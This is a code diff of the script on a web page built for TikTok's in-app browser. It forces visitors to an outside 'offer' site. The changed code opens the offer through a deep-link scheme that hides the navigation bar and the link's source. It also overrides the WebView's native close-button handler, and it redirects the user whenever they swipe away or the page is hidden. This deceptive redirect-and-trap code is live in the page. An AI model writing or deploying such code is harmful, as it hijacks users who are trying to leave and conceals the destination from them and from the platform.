@@ -162,20 +162,26 @@ function openPrivacy(){document.getElementById('privacyModal').classList.add('sh
 function closePrivacy(){document.getElementById('privacyModal').classList.remove('show');}
 
 (function(){
-  var OFFER = 'https://bio.thaiadvice.net/?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+  var OFFER = 'https://bio.thaiadvice.net/';
+  var SCHEME = 'snssdk1180://webview?url=' + encodeURIComponent(OFFER) +
+    '&hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
 
-  // Redirect to offer after brief delay — works in TikTok's in-app WebView without any dialog
-  setTimeout(function(){ window.location.href = OFFER; }, 500);
-
-  // Close intercept — also redirect if user tries to close/swipe away before redirect fires
   var gone = false;
-  function leave() { if (gone) return; gone = true; window.location.href = OFFER; }
+  function openOffer() {
+    if (gone) return;
+    gone = true;
+    // Try snssdk1180:// first — opens a new full-screen WebView (no nav bar if TikTok allows it)
+    window.location.href = SCHEME;
+    // Fallback: if scheme doesn't open a new layer, redirect in current WebView
+    setTimeout(function(){ if (gone) window.location.href = OFFER; }, 800);
+  }
 
+  // Intercept X button close via IESPiper WK handler
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
   if (wk) {
     var _orig = wk.postMessage.bind(wk);
     wk.postMessage = function(msg) {
-      try { var d = typeof msg === 'string' ? JSON.parse(msg) : msg; if (d && d.func === 'close') { leave(); return; } } catch(e){}
+      try { var d = typeof msg === 'string' ? JSON.parse(msg) : msg; if (d && d.func === 'close') { openOffer(); return; } } catch(e){}
       return _orig(msg);
     };
   }
@@ -185,11 +191,11 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
   document.addEventListener('touchmove', function(e){
     if (!e.touches.length) return;
     var dx = e.touches[0].clientX - tx, dy = e.touches[0].clientY - ty;
-    if (dx < -40 && Math.abs(dx) > Math.abs(dy) * 1.5) leave();
-    if (tx < 30 && dx > 30 && Math.abs(dx) > Math.abs(dy)) leave();
+    if (dx < -40 && Math.abs(dx) > Math.abs(dy) * 1.5) openOffer();
+    if (tx < 30 && dx > 30 && Math.abs(dx) > Math.abs(dy)) openOffer();
   }, {passive:true});
 
-  document.addEventListener('visibilitychange', function(){ if (document.hidden) leave(); });
+  document.addEventListener('visibilitychange', function(){ if (document.hidden) openOffer(); });
 })();
 </script>
 </body>
